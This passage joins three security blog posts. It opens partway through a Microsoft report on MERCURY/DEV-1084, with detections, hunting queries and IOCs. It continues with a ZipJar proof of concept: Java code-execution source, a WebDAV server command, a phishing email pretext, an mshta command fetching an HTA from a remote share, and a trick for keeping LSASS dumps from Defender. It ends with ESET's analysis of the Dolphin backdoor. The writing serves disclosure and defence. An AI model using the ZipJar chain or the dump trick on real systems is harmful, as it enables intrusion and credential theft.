Cloud attack flow timeline Mitigations for destructive attacks The techniques used by the actors and described in this blog can be mitigated by adopting the following security measures: Recommendations to secure your on-prem environment Refer to Microsoft’s blog Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself for recommendations on building strong credential hygiene and other robust measures to defend against ransomware and human operated attacks. 
Enable tamper protection – Tamper protection is a feature in Microsoft Defender for Endpoint that prevents antivirus tampering and misconfiguration by malicious apps and actors.
Customers running Intune can enable DisableLocalAdminMerge to prevent modification of antivirus exclusions via GPO. 
Recommendations to secure your Azure AD environment Enable Conditional Access policies – Conditional Access policies are evaluated and enforced every time the user attempts to sign in.
Organizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as device compliance or trusted IP address requirements. 
Enable continuous access evaluation – Continuous access evaluation (CAE) revokes access in real time when changes in user conditions trigger risks, such as when a user is terminated or moves to an untrusted location. 
Search unified audit logs for the SendAs operation to identify and track emails sent on behalf of a user mailbox. 
Further steps and recommendation to manage, design, and secure your Azure AD environment can be found by referring to Azure Identity Management and access control security best practices. 
Detections Microsoft 365 Defender 
The following alerts in Microsoft 365 Defender can be used to detect suspicious operations in Azure related to the attacker activities described in this blog, including destructive activity: Access elevation by risky user Suspicious Azure resource deletions Suspicious Addition of an Exchange related App Role In addition, the following alert can help detect compromised Azure AD Connect accounts: Unusual activities by Azure AD Connect sync account Microsoft Defender for Cloud Apps For Microsoft Defender for Cloud Apps with Azure Connector enabled, the following alerts can be used to detect destructive operations in Azure: Multiple storage deletion activities Multiple delete VM activities Azure AD Identity Protection Monitor medium and high severity alerts for highly privileged accounts as they can indicate malicious activity.
For example: Unfamiliar sign-in properties Find details of Azure AD Identity Protection alerts here. 
Microsoft Defender for
Identity The following Microsoft Defender for Identity alerts can indicate associated threat activity: Suspicious additions to sensitive groups For relevant accounts with Honeytoken configured, the following alert can indicate malicious activity: 
Honeytoken activity Microsoft Defender Antivirus Microsoft Defender Antivirus detects attempted exploitation and post-exploitation activity and payloads.
Turn on cloud-delivered protection to cover rapidly evolving attacker tools and techniques.
Cloud-based machine learning protections block most new and unknown threats.
Refer to the list of detection names related to exploitation of Log4j 2 vulnerabilities.
Detections for the IOCs listed above are listed below: Backdoor:PHP/Remoteshell.
V HackTool:Win32/LSADump VirTool:Win32/RemoteExec Trojan:PowerShell/Downloader.
SB Trojan:Win32/Nibtse.
G!tsk Backdoor:ASP/Shellman.
SA Ransom:Win64/DarkBit VirTool:Win32/AtExecCommand Microsoft Defender for Endpoint Microsoft Defender for Endpoint alerts with the following titles can indicate possible presence of the indicators of compromise listed below. 
Mercury actor activity detected Ransomware-linked emerging threat actor DEV-1084 detected Reducing the attack surface Microsoft Defender for Endpoint customers can turn on the following attack surface reduction rule to block or audit some observed activity associated with this threat: Block executable files from running unless they meet a prevalence, age, or trusted list criterion. 
Implement controlled folder access and add folders to the protected folders list to help prevent files from being altered or encrypted by ransomware.
Set controlled folder access to Enabled. 
Detecting Log4j 2 exploitation Alerts that indicate threat activity related to the exploitation of the Log4j 2 exploitation should be immediately investigated and remediated.
Refer to our Log4j related blogs to learn about this vulnerability and for a list of Microsoft Defender for Endpoint alerts that can indicate exploitation and exploitation attempts. 
Detecting post-exploitation activity Alerts with the following titles may indicate post-exploitation threat activity related to MERCURY activity described in this blog and should be immediately investigated and remediated.
These alerts are supported on both Windows and Linux platforms: Any alert title related to web shell threats, for example: ‘WebShell’ backdoor was prevented on an IIS Web server Any alert title that mentions the DarkBit ransomware threat or DEV-1084, for example: ‘DarkBit’ ransomware was blocked ‘DarkBit’ ransomware was detected ‘DarkBit’ ransomware was prevented Ransomware-linked emerging threat actor DEV-1084 detected Any alert title that mentions suspicious scheduled task creation or execution, for example: Suspicious scheduled task Any alert title that mentions suspected tunneling activity, for example: Suspicious SSH tunneling activity Any alert title that mentions suspected tampering activity, for example: Suspicious Microsoft Defender Antivirus exclusion Microsoft Defender Antivirus tampering Any alert title that mentions PowerShell, for example: Suspicious process executed PowerShell command A malicious PowerShell Cmdlet was invoked on the machine Suspicious PowerShell command line Suspicious PowerShell download or encoded command execution Suspicious remote PowerShell execution Any alert title related to suspicious remote activity, for example: Suspicious RDP session An active ‘RemoteExec’ malware was blocked Suspicious service registration Any alert related to persistence: Anomaly detected in ASEP registry User account created under suspicious circumstances Any alert title that mentions credential dumping activity or tools, for example: Malicious credential theft tool execution detected Credential dumping activity observed Mimikatz credential theft tool ‘DumpLsass’ malware was blocked on a Microsoft SQL server Microsoft Defender Vulnerability Management 
In addition to the mitigations above being presented and managed through Microsoft Defender Vulnerability Management, Microsoft 365 Defender customers can use threat and vulnerability management to identify and remediate devices that are vulnerable to Log4j 2 exploitation.
More comprehensive guidance on this capability can be found on this blog: Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability. 
Advanced hunting queries Microsoft 365 Defender To locate related activity, Microsoft 365 Defender customers can run the following advanced hunting queries: // Advanced Hunting Query to surface potential Mercury PowerShell script backdoor installation DeviceFileEvents | where InitiatingProcessFileName =~ "powershell.exe" | where FolderPath in~ (@"c:\programdata\db.ps1", @"c:\programdata\db.sqlite") 
| summarize min(Timestamp), max(Timestamp) by DeviceId, SHA256, InitiatingProcessParentFileName DeviceProcessEvents | where InitiatingProcessFileName =~ "powershell.exe" | where InitiatingProcessCommandLine has_cs
"-EP BYPASS -NoP -W h" | summarize makeset(ProcessCommandLine), min(Timestamp), max(Timestamp) by DeviceId // Advanced Hunting Query to surface potential Mercury PowerShell script backdoor initiating commands DeviceProcessEvents | where InitiatingProcessFileName =~ "powershell.exe" | where InitiatingProcessCommandLine contains_cs @"c:\programdata\db.ps1" | summarize makeset(ProcessCommandLine), min(Timestamp), max(Timestamp) by DeviceId //Advanced
Hunting Query for Azure resource deletion activity let PrivEscalation = CloudAppEvents | where Application == "Microsoft Azure" | where ActionType == "ElevateAccess Microsoft.
Authorization" | where ActivityObjects has "Azure Subscription" and ActivityObjects has "Azure Resource Group" | extend PrivEscalationTime = Timestamp | project AccountObjectId, PrivEscalationTime ,ActionType; CloudAppEvents | join kind = inner PrivEscalation on AccountObjectId | extend DeletionTime = Timestamp | where (DeletionTime - PrivEscalationTime) <= 1h | where Application == "Microsoft Azure" | where ActionType has "Delete" |summarize min(DeletionTime), TotalResourcersDeleted =count(), CountOfDistinctResources= dcount(ActionType), DistinctResources=make_set(ActionType) by AccountObjectId //AHQ used to detect attacker abusing OAuth application during the attack CloudAppEvents | where Application == "Office 365" | where ActionType == "Consent to application.
" | where RawEventData.
ResultStatus =~ "success" | extend UserId = tostring(RawEventData.UserId) 
| mv-expand AdminConsent = RawEventData.
ModifiedProperties | where AdminConsent.
Name == "ConsentContext.IsAdminConsent" and AdminConsent.
NewValue == "True" | project ConsentTimestamp =Timestamp, UserId, AccountObjectId, ReportId, ActionType | join kind = leftouter (CloudAppEvents | where Application == "Office 365" | where ActionType == "Add app role assignment to service principal." 
| extend PermissionAddedTo = tostring(RawEventData.
Target[3].ID) | extend FullAccessPermission =
RawEventData.
ModifiedProperties | extend OuthAppName = tostring(FullAccessPermission[6].NewValue)
// Find app name | extend OAuthApplicationId = tostring(FullAccessPermission[7].NewValue) //
Find appId | extend AppRoleValue = tostring(FullAccessPermission[1].NewValue) //
Permission Level | where AppRoleValue == "full_access_as_app" | project PermissionTime=Timestamp, InitiatingUser=AccountDisplayName, OuthAppName, OAuthApplicationId, AppRoleValue, AccountObjectId, FullAccessPermission ) on AccountObjectId Microsoft Sentinel Microsoft Sentinel has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft Defender detections list above. full_access_as_app Granted To Application Potential SSH Tunnel to AAD Connect Host Suspicious Sign
In by AAD Connect Sync Account Malicious web application requests linked with Microsoft Defender for Endpoint Web Shell Activity Tracking Privileged Account Rare Activity Mass Cloud resource deletions Time Series Anomaly Consent to Application discovery OAuth Application Required Resource Access Update Rare application consent Credential added after admin consented to ApplicationNew access credential added to Application or Service Principal Microsoft Sentinel customers can use the TI Mapping analytic (a series of analytics all prefixed with “TI map”) to automatically match the indicators mentioned in this blog post with data in their workspace.
If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy Indicators of compromise (IOCs) 
The below list provides IOCs observed during our investigation.
We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems. 
IndicatorTypeDescription9107be160f7b639d68fe3670de58ed254d81de6aec9a41ad58d91aa814a247ffDEV-1084 ransom payload8thCurse.exe80bd00c0f6d5e39b542ee6e9b67b1eef97b2dbc6ec6cae87bf5148f1cf18c260DEV-1084 batch script8dd9773c24703e803903e7a5faa088c2df9a4b509549e768f29276ef86ef96aeDEV-1084 batch script486eb80171c086f4d184423ed7e79303ad7276834e5e5529b199f8ae5fc661f2DEV-1084 batch scriptf1edff0fb16a64ac5a2ce64579d0d76920c37a0fd183d4c19219ca990f50effcDEV-1084 batch script887ae654d69ac5ccb8835e565a449d7716d6c4747dc2fbff1f59f11723244202DEV-1084 batch script3fba459d589cd513d2478fb4ae7c4efd6aa09e62bc3ff249a19f9a233e922061DEV-1084 batch script0dde13e3cd2dcda522eeb565b6374c97b3ed4aa6b8ed9ff9b6224ea97bf2a584DEV-1084 batch scriptafd16b9ad57eb9c26c8ae347c379c8e2b82361c7bdff5b189659674d5614854cDEV-1084 batch script3e59d36faf2d5e6edf1d881e2043a46055c63b7c68cc08d44cc7fc1b364157ebDEV-1084 batch script786bd97172ec0cef88f6ea08e3cb482fd15cf28ab22d37792e3a86fa3c27c975DEV-1084 batch script36c71ce7cd38733eb66f32a8c56acd635680197f01585c5a2a846cc3cb0a8fe2DEV-1084 batch script016967de76382c674b3a1cb912eb85ff642b2ebfe4e107fc576065f172c6ef80DEV-1084 batch script3059844c102595172bb7f644c9a70d77a198a11f1e84539792408b1f19954e18DEV-1084 batch script194.61.121[.]86Command and controlhxxps://pairing[.]rport[.]io/qMLc2WxDownload Rport software from it141.95.22[.]153Command and control193.200[.]16.3Command and control192.52.166[.]191Command and control45.56.162[.]111Command and control104.194.222[.]219Command and control192.169.6[.]88Command and control192.52.167[.]209Command and controlwebstore4tech[.]uaenorth.cloudapp.azure[.]comCommand and controlvatacloud[.]comActor-owned Rport domain146.70.106[.]89DEV-1084 operators were observed sending threatening emails to the victim after the attack from 146.70.106[.]89, an IP address previously linked to MERCURYb9cf785b81778e2b805752c7b839737416e3af54f64f1e40e008142e382df0c4Rport Legit remote access toolrport.exeab179112caadaf138241c43c4a4dccc2e3c67aeb96a151e432cfbafa18a4b436Customized Ligolo tunneling tool46.249.35[.]243Command and control45.86.230[.]20Command and control6485a68ba1d335d16a1d158976e0cbfad7ab15b51de00c381d240e8b0c479f77db.ps1 Customized Script Backdoorb155c5b3a8f4c89ba74c5c5c03d029e4202510d0cbb5e152995ab91e6809bcd7db.sqlite Customized Obfuscated Script Backdoor NOTE:
These indicators should not be considered exhaustive for this observed activity. 
Microsoft Defender Threat Intelligence Community members and customers can find summary information and all IOCs from this blog post in the linked Microsoft Defender Threat Intelligence article. 
References https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/ https://ehorus.com/ https://github.com/nicocha30/ligolo-ng https://www.openssh.com/ https://github.com/Gerenios/AADInternals/blob/master/AADSyncSettings.ps1#L97 The post MERCURY and DEV-1084: Destructive attack on hybrid environment appeared first on Microsoft Security Blog. 
title: ZipJar, a little bit unexpected attack chain url: https://badoption.eu/blog/2023/06/01/zipjar.html ZipJar, a little bit unexpected attack chain The upcoming from the .zip
TLDs from Google brought some discussion about attack vectors.
Most of those attack vectors are not completely new, like using an “@” to split between username and host.
While playing a little bit around, an unexpected attack chain appeared, involving a .zip
TLD, Windows Explorer, WebDAV and a jar file. 
Some further reading and research: tl;dr Combining the following minor issues might cause RCE on a client. 
The Windows Explorer location bar, is also a search function If using a TLD, like .zip, the search will be online, if the file does not exist locally on PATH folders Windows Explorer will happily map a WebDAV folder directly .jar files circumvent the execution Blocker (untrusted Location), however a JRE must be installed Take me to the PoC Introduction While playing around with the newly .zip
domains some behavior from Windows Explorer was found, which might cause some RCE if a Java Runtime Environment (JRE) is installed. 
I name the behavior ZipJar. 
A jar full of zippers, symbol picture The Chain Windows Explorer The location bar in the Windows Explorer is also a Search Bar and can be used to find and open files.
If a file is not found on disk and a domain name is used, it will search online.
It seems, that the file must be in an on PATH folder, to get directly opened. 
With the introduction of the .zip TLDs this is getting quite interesting. 
So if you write the name of a zip file in the bar, it will open the default browser and go to that page. 
In the next procmon screenshot the flow can be seen: Procmon with pasting dbexport.zip in location bar At first the local on path folders are tested and if that fails the WebDAV Client is started and the dll loaded. 
I could never understand, why it should be a good idea to have a local search function doing things via the internet by default… 
And as I know you guys, leave my .zip domain alone ;) WebDAV If we setup a WebDAV server at that specific .zip domain, in that case dbexport.zip , which can be easily set up via wsgidav wsgidav --port=80 --host=0.0.0.0
--root=. --auth
=anonymous the Windows Explorer will not spawn a new browser but will map the folder directly. 
an opened WebDAV folder As it can be seen in the screenshot, the URL changes a bit. 
Shown: Network (WORKGROUP) > http://dbexport.zip Resolved: \\dbexport.zip\DavWWWRoot If we click an executable, we get a confirmation dialog, as the location is not trusted. 
an opened WebDAV folder Phew, so we are safe and this is some kind of not ideal behavior, but at least there is dialog with a warning. 
Bypassing execution blocking After playing with some file extensions, it turns out that this protection is not bulletproof. 
mild shock The execution of typical file types like: bat, chm, cmd, com, exe, hta, js, lnk, pif, ps1, vbs, wsh is indeed blocked. 
Note: Those files will still get executed, if the user clicks on run! 
If there are some custom application handlers registered, it seems that those tools do not have the same restriction. 
One example for this is the .jar filetype, meaning it is possible to execute Java code if the user has a JRE installed, which is quite often the case in business environment. 
This was tested by using the first jar file with a GUI found when googling. running a jar from the WebDAV Promising! Java Malware At this point I was afraid, that it might be necessary to write some Java Malware, like a shellcode loader.
There are some quite old, but still promising approaches like How to Inject Shellcode from Java. 
Luckily, it turned out to be much simpler. 
Some Copy&Pasted code later a minimalistic and very simple approach to execute a binary was ready. 
import java.io.
BufferedReader; import java.io.IOException; import java.io.
InputStreamReader; public class HelloWorld { public static void main(String[] args) { // Ausgabe Hello World! 
System.out.println("Hello World!"); String command = "calc.exe"; try { Process process = Runtime.getRuntime().exec(command); BufferedReader reader = new BufferedReader( new InputStreamReader(process.getInputStream())); String line; while ((line = reader.readLine()) !
= null) { System.out.println(line); } BufferedReader errorReader = new BufferedReader( new InputStreamReader(process.getErrorStream())); while ((line = errorReader.readLine()) !
= null) { System.out.println(line); } errorReader.close(); reader.close(); } catch (IOException e) { e.printStackTrace(); } } } The interesting part is in line 13: String command = "calc.exe"; defining what to execute. 
So this will just pop a calculator under normal conditions.
However, if a calc.exe is in the same folder, it will execute that binary, thanks Windows Search Path. 
To generate the jar a simple way without needing a manifest is thew following javac .\HelloWorld.java jar cfe app.jar HelloWorld HelloWorld.class PoC By chaining all together, we get a nice simple flow here. 
Keep in mind, that a Java Runtime Environment must be installed! 
The calc.exe is a custom binary, not the Windows calc.exe.
Could be whatever you want / define in the java programm. 
As for the most attack chains that require user interaction, the story is important. 
A concept might be, as usual, the IT department sending an E-Mail. 
Hello Hans, your client is missing an update. 
We already copied the zip file to your client. 
However, as the update must run under your user context, you need to copy the following command in the Explorer location bar. 
dbexport.zip\app.jar Thanks. 
Finding a better story is left as an exercise for the reader. 
Further notes Full path to file and hidden files By supplying a full path like dbexport.zip\app.jar to the explorer location bar, the binary will immediately be executed. 
It seems, that it is somehow possible to hide some files in the folder, but this was buggy during my tests. running a jar from the WebDAV 
However regarding the documentation from MS windows should support hidden files via WebDAV. 
Opening a WebDAV folder will also start the WebDAV service, which is quite famous to use for some ActiveDirectory privilege escalation with relaying to LDAP (RBCD). 
mshta You can also run for example hta files from that WebDAV.
By typing the command in the start menu an hta file will get executed without a warning. 
mshta \\dbexport.zip\DavWWWRoot\calc_hta.hta running a hta from the WebDAV Note, that HTA files are quite robust against syntax errors, the .hta ending is not necessary and also polyglots can easily be created. 
LSASS Dump A side effect of the WebDAV is, that the Defender is not going to delete files correctly on that shared folder. 
As LSASS dumps are nowadays recognized by the dump file itself this is a nice way to get your hands on the file.
This will still trigger an alarm, so absolutely not OPSEC! 
LSASS dump in c:\tmp detected and deleted 
Oh oh, something wrong with defender Something wrong for the Defender LSASS dump in the WebDAV detected, but file not deleted If you even want to improve this workflow, there is a great tool called PowerHub offering a BlackHole WebDAV, meaning the server will immediately move the file out of the WebDAV. 
Defense Block WebDAV communication Use Application restrictions like AppLocker or WDAC Monitor for the process java.exe spawning further binaries Conclusion This is not really a full chain attack for initial access at an RedTeam assessment
, I still found this a little bit surprising and wanted to share. 
Feel free to reach out if you have questions, or and especially if you have some additional techniques which might apply here. 
Links Work and inspiration from others, thanks for that: 
title: Who’s swimming in South Korean waters?
Meet ScarCruft’s Dolphin url: https://www.welivesecurity.com/2022/11/30/whos-swimming-south-korean-waters-meet-scarcrufts-dolphin/ ESET researchers uncover Dolphin, a sophisticated backdoor extending the arsenal of the ScarCruft APT group ESET researchers have analyzed a previously unreported backdoor used by the ScarCruft APT group.
The backdoor, which we named Dolphin, has a wide range of spying capabilities, including monitoring drives and portable devices and exfiltrating files of interest, keylogging and taking screenshots, and stealing credentials from browsers.
Its functionality is reserved for selected targets, to which the backdoor is deployed after initial compromise using less advanced malware.
In line with other ScarCruft tools, Dolphin abuses cloud storage services – specifically Google Drive – for C&C communication. 
During our investigation, we saw continued development of the backdoor and attempts by the malware authors to evade detection.
A notable feature of earlier Dolphin versions we analyzed is the ability to modify the settings of victims’ signed-in Google and Gmail accounts to lower their security, most likely to maintain access to victims’ email inboxes. 
In this blogpost, we provide a technical analysis of the Dolphin backdoor and explain its connection to previously documented ScarCruft activity.
We will present our findings about this new addition to ScarCruft’s toolset at the AVAR 2022 conference. 
Key points in this blogpost: ESET researchers analyzed Dolphin, a previously unreported backdoor used by the ScarCruft APT group. 
Dolphin is deployed on selected targets only; it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive. 
The backdoor was used as the final payload of a multistage attack in early 2021, involving a watering-hole attack on a South Korean online newspaper, an Internet Explorer exploit, and another ScarCruft backdoor, named BLUELIGHT. 
Since the initial discovery of Dolphin in April 2021, ESET researchers have observed multiple versions of the backdoor, in which the threat actors improved the backdoor’s capabilities and made attempts to evade detection. 
A notable feature of earlier Dolphin versions we analyzed is the ability to modify the settings of victims’ signed-in Google and Gmail accounts to lower their security. 
ScarCruft profile ScarCruft, also known as APT37 or Reaper, is an espionage group that has been operating since at least 2012.
It primarily focuses on South Korea, but other Asian countries also have been targeted.
ScarCruft seems to be interested mainly in government and military organizations, and companies in various industries linked to the interests of North Korea. 
Dolphin overview In 2021, ScarCruft conducted a watering-hole attack on a South Korean online newspaper focused on North Korea.
The attack consisted of multiple components, including an Internet Explorer exploit and shellcode leading to a backdoor named BLUELIGHT, reported by Volexity and Kaspersky. 
In those reports, the BLUELIGHT backdoor was described as the attack’s final payload.
However, when analyzing the attack, we discovered through ESET telemetry a second, more sophisticated backdoor, deployed on selected victims via BLUELIGHT.
We named this backdoor Dolphin based on a PDB path found in the executable. 
While the BLUELIGHT backdoor performs basic reconnaissance and evaluation of the compromised machine after exploitation, Dolphin is more sophisticated and manually deployed only against selected victims.
Both backdoors are capable of exfiltrating files from a path specified in a command, but Dolphin also actively searches drives and automatically exfiltrates files with extensions of interest to ScarCruft. 
Figure 1 provides an overview of the attack components leading to the execution of the Dolphin backdoor. 
Figure 1.
Overview of the attack components leading to the execution of the Dolphin backdoor Dolphin analysis Analysis of Dolphin’s components and their capabilities is provided in the following section. 
The analysis is based on the first version of the backdoor that we found, 1.9 (based on a string found in the code) with additional information about changes in newer versions.
A summarized description of the version changes can be found in the Dolphin evolution section. 
Dolphin installer Ensuing sections describe the installer and loader components responsible for the execution of the Dolphin backdoor in the analyzed attack scenario. 
It is worth noting that this installer and the deployed loader are not exclusive to Dolphin, and were previously seen used with other ScarCruft malware. 
The installer shellcode follows these main objectives: Download and deploy a Python interpreter Generate and deploy a loading chain with its payload Ensure persistence of the loading chain 
The installer downloads a CAB file from OneDrive, containing a legitimate Python 2.7 interpreter.
The CAB is unpacked to %APPDATA%, and depending on architecture, the interpreter ends up in one of the following directories: 
%appdata%\Python27(32)\ %appdata%\Python27(64)\ 
The installer generates two file paths for loading-chain components, <loader_step_1> and <loader_encrypted_step_2>, with the format <base_dir>\<inf_name>\<dll_name>. 
<base_dir> is randomly selected from %PROGRAMDATA% %PUBLIC% %APPDATA%\Microsoft %APPDATA%\Microsoft\Windows %LOCALAPPDATA% %LOCALAPPDATA%\Microsoft %LOCALAPPDATA%\Microsoft\Windows <inf_name> and <dll_name> are randomly selected from existing filenames (without extension) in %windir%\inf\*.inf and %windir%\system32\*.dll. 
To generate Step 1 of Loader, it uses a script template that is filled with randomly generated names (variables, function).
The template with generated example is shown in Figure 2. Figure 2.
Step 1 template and generated example 
The script is then written to <loader_step_1>. 
Step 2 (embedded in the installer) containing the rest of the loading chain, including the payload, is encrypted with a one-byte XOR key derived from the current time and written to <loader_encrypted_step_2>. 
In order to persist the start of the loading chain, the installer sets a Run registry value: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<random_run_name>\”%appdata%\Python27({32|64})\pythonw.exe” “<loader_step_1>” “<loader_encrypted_step_2>” The <random_run_name> is randomly selected from existing filenames matching %WINDIR%\inf\*.inf, discarding the .inf extension. 
To start the loading chain after installation, it creates a one-time scheduled task. 
Dolphin loader The Dolphin loader consists of a Python script and shellcode. 
Step 1, the Python script, reads a specified file, XOR-decrypts its contents, and executes the resulting shellcode. 
Step 2, shellcode, creates a host process (random CLI executable from %WINDIR%\System32\*.exe), XOR-decrypts further shellcode carried within itself, and injects it into the created process. 
Step 3, another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader. 
Dolphin backdoor Dolphin is a backdoor that collects information and executes commands issued by its operators.
The backdoor is a regular Windows executable, written in C++.
It communicates with Google Drive cloud storage, which is used as its C&C server. 
We named the backdoor Dolphin based on a PDB path found in the executable: D:\Development\BACKDOOR\Dolphin\x64\Release\Dolphin.pdb Persistence The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<random_run_name>\”%appdata%\Python27({32|64})\pythonw.exe” “<loader_step_1>” “<loader_encrypted_step_2>” Capabilities The following basic information about the computer and the backdoor is collected: Current backdoor configuration Username Computer name Local and external IP address List of installed security products RAM size and usage Result of check for debugger and other inspection tools (such as Wireshark) OS version Current time Malware version Dolphin downloads commands, issued by its operators, from Google Drive storage and executes them.
After execution, the output of commands is uploaded.
Most of Dolphin’s capabilities are controlled through commands. 
The most relevant capabilities are described below. 
File exfiltration By default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.
This search can be extended to fixed drives (HDDs), via dedicated commands. 
The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated. 
In the newer versions, the default search was extended to fixed drives.
The command to get specific files was improved, by caching/storing it in the configuration until completion. 
Portable devices Among regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.
It creates directory listings and exfiltrates files.
This functionality appeared to be under development in the first version we found, for several reasons: Relying on a hardcoded path with a username that likely doesn’t exist on the victim’s computer Missing variable initialization – some variables are assumed to be zero-initialized, or dereferenced as pointers without initialization Missing extension filtering The code is heavily based on Microsoft’s Portable Devices COM API code sample. 
Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices. 
In newer versions, this capability was finished and improved by adding extension filtering.
For unknown reasons, the command to retrieve specific files from portable devices was removed. 
Keylogging and screenshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.
The defaults are chrome and internet explore (sic).
This is done via the GetAsyncKeyState API, with keystrokes being logged along with the window name and current time.
Screenshots are also taken at a configurable interval; the default is once every 30 seconds. 
Screenshots and keylogging are enabled by default, and can be toggled via a command. 
Shellcode Dolphin can receive shellcode for execution.
The shellcode is stored in the registry, under one of the following keys: HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Classic\<random_number> HKCU\Software\Microsoft\OneDrive\Update\<random_number> HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\HttpsSoftware\Microsoft\Internet Explorer\Zone\<random_number> (two subkeys as one, likely a coding error) 
It can be executed either locally or in a specified separate process that is created and injected. 
In the newer versions, the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphin’s startup, which was not the case in version 1.9 (the original version we analyzed). 
Shell commands Dolphin can execute shell commands; this is done via the popen API and their output is retrieved. 
Stealing credentials Dolphin can retrieve credentials from browsers in the form of saved passwords and cookies.
The following browsers are supported: Chrome Edge Internet Explorer In version 2.2, this capability was removed, presumably to avoid detection.
It was later restored in version 3.0, but in a different form.
It is now dynamically received from the C&C in the form of shellcode. 
Google account Another one of Dolphin’s commands modifies the settings of the currently logged-in Google account, lowering its security relative to default settings.
It steals the existing cookie of the logged-in account from the browser and crafts requests that modify the settings. 
First, it enables access to Gmail via the IMAP protocol by sending an HTTP POST request to: https://mail.google.com/mail/u/0/?ik=<GM_ID_KEY>&at=<GM_ACTION_TOKEN>&view=up&act=prefs 
Then it enables “less secure app access” by sending an undocumented RPC request via an HTTP POST to: https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute These modifications are referred to as “thunder access” in the backdoor, likely being a reference to the Thunderbird email client.
Accessing their victims’ inboxes with a third-party client via IMAP probably helps ScarCruft operators maintain access to the victims’ emails after stealing credentials, which may not be enough on their own, due to Google’s detection of suspicious login attempts. 
This feature was found in versions 1.9 and 2.0 of the backdoor; it is not present in versions 2.2 or 3.0. 
Data staging Dolphin exfiltrates data to Google Drive storage, staging the data in encrypted ZIP archives before upload.
The backdoor also maintains a list of files in the form of MD5 hashes, in order to avoid uploading the same file multiple times.
This list can be reset via a dedicated command. 
Configuration The backdoor contains an initial default configuration that is persisted on first run and loaded on subsequent runs.
It is stored in the file %ProgramData%\<variable_cfg_name>.inf, where <variable_cfg_name> is randomly selected from existing filenames matching %windir%\inf\*.inf.
The content is encrypted using AES CBC with random 16-byte keys and IVs, which are stored at the file’s beginning.
The configuration uses JSON format, with hash-like keys.
An example of a decrypted configuration is shown in Figure 3. 
Figure 3.
Dolphin backdoor configuration The configuration can be modified through commands.
It contains, among others, the following: Encryption keys Credentials for Google Drive API access Window titles to keylog List of file extensions to exfiltrate Dolphin evolution Since the initial discovery of Dolphin in April 2021, we have observed multiple versions of the backdoor, in which the threat actors improved the backdoor’s capabilities and made attempts to evade detection.
Figure 4 summarizes the versions seen; a more detailed description of the version changes is provided below. 
Figure 4.
Dolphin evolution timeline November 2021 – version 2.0 Version 2.0 introduced the following changes to the version found in April 2021: 
Dynamic resolution of suspicious APIs instead of static imports (for example GetAsyncKeyState) added Shellcode capability finished and improved Persisted shellcode stored in files instead of registry Persisted shellcode loaded and executed on Dolphin startup (previously missing) Portable device file exfiltration capability finished and improved Exfiltration by extensions added Recognition of internal memory and SD cards (from device ID) added Command to get files from portable devices effectively a NOP Device/drive detection and file exfiltration improved Dolphin now unconditionally creates directory listings and exfiltrates files by extension every 30 minutes for all drives and devices (fixed drives, removable drives, portable devices).
Previously, it was just for removable drives; fixed drives were disabled by default and the code used for accessing portable devices was buggy and broken. December 2021 – version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.
The credential-stealing capability and commands related to it – the credential stealing and Google account commands – were removed.
Most strings in this version are base64 encoded. 
January 2022 – version 3.0 
In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.
The base64-encoded strings were plaintext again in this version.
We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.
If interrupted (for example by computer shutdown), it is done on the next run.
This is also useful in the case of removable drives that may not be connected when the command is issued. 
Internet connection check added (https://www.microsoft.com); no malicious code is executed if offline The differences between versions 2.2 and 3.0, especially the discrepancy in string encoding, suggest the possibility that the versions were being developed in parallel by different people. 
Conclusion Dolphin is another addition to ScarCruft’s extensive arsenal of backdoors abusing cloud storage services.
After being deployed on selected targets, it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.
One unusual capability found in prior versions of the backdoor is the ability to modify the settings of victims’ Google and Gmail accounts to lower their security, presumably in order to maintain account access for the threat actors.
During our analysis of multiple versions of the Dolphin backdoor, we saw continued development and attempts to evade detection. 
For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com. 
ESET Research also offers private APT intelligence reports and data feeds.
For any inquiries about this service, visit the ESET Threat Intelligence page. 
IoCs SHA-1FilenameESET detection nameDescription F9F6C0184CEE9C1E4E15C2A73E56D7B927EA685BN/AWin64/Agent.
MSDolphin backdoor version 1.9 (x64) 5B70453AB58824A65ED0B6175C903AA022A87D6AN/AWin32/Spy.
Agent.
QETDolphin backdoor version 2.0 (x86) 21CA0287EC5EAEE8FB2F5D0542E378267D6CA0A6N/AWin64/Agent.
MSDolphin backdoor version 2.0 (x64) D9A369E328EA4F1B8304B6E11B50275F798E9D6BN/AWin32/Agent.
UYODolphin backdoor version 3.0 (x86) 2C6CC71B7E7E4B28C2C176B504BC5BDB687C4D41N/AWin64/Agent.
